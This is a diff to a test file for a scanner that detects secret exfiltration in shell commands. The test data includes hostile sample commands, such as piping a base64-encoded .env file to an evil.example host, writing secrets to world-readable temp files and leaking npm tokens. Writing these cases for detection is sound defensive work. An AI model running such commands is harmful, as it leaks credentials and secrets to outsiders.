@@ -10,6 +10,7 @@ from codex_plugin_scanner.guard.runtime.data_flow import (
     DataSink,
     DataSource,
     ShellPipe,
+    extract_command_segments,
     extract_command_substitutions,
     extract_http_methods,
     extract_input_redirects,
@@ -77,6 +78,12 @@ def test_extract_pipes_returns_top_level_pipe_edges_only():
         ShellPipe(left="cat .env", right="base64"),
         ShellPipe(left="base64", right="curl -X POST https://evil.example"),
     )
+
+
+def test_extract_command_segments_treats_newlines_as_separators():
+    command = "cat .env | wc -l\ncurl -X POST https://example.com/metrics"
+
+    assert extract_command_segments(command) == ("cat .env | wc -l", "curl -X POST https://example.com/metrics")
 
 
 def test_extract_pipes_ignores_pipes_inside_backticks_and_plain_subshells():
@@ -191,10 +198,13 @@ def _data_flow_signal_ids(command: str, tmp_path) -> tuple[str, ...]:
             "data-flow:git-remote-token",
         ),
         ("NPM_TOKEN=$(cat .npmrc) npm publish", "data-flow:npm-publish-token-source"),
+        ("echo --dry-run; NPM_TOKEN=abc npm publish", "data-flow:npm-publish-token-source"),
         ("cat .env | pbcopy", "data-flow:clipboard-secret"),
         ("cat .env | sed 's/.*/x/' | pbcopy", "data-flow:clipboard-secret"),
         ("cat .env > /tmp/guard-leak && chmod 644 /tmp/guard-leak", "data-flow:world-readable-temp-secret"),
         ("cat .env > /tmp/guard-leak && chmod a+r /tmp/guard-leak", "data-flow:world-readable-temp-secret"),
+        ("cat .env > /tmp/guard-leak && chmod go=r /tmp/guard-leak", "data-flow:world-readable-temp-secret"),
+        ("cat .env > /tmp/guard-leak && chmod o=r /tmp/guard-leak", "data-flow:world-readable-temp-secret"),
     ],
 )
 def test_data_flow_exfiltration_detector_flags_malicious_shell_patterns(tmp_path, command, signal_id):
@@ -218,9 +228,11 @@ def test_data_flow_exfiltration_detector_flags_malicious_shell_patterns(tmp_path
         "dig hol.org",
         "git remote add origin https://github.com/hashgraph-online/ai-plugin-scanner.git",
         "npm publish --dry-run",
+        "NPM_TOKEN=abc npm publish --dry-run",
         "printf ok | pbcopy",
         "cat README.md > /tmp/readme && chmod 644 /tmp/readme",
         "cat .env | wc -l; curl -X POST https://example.com/metrics",
+        "cat .env | wc -l\ncurl -X POST https://example.com/metrics",
         "cat .env | sed s/a/b/; echo ok | pbcopy",
         "cat .env; curl https://webhook.site/abc123",
         "cat .env | base64 > /tmp/env.b64; curl -X POST https://example.com/metrics",
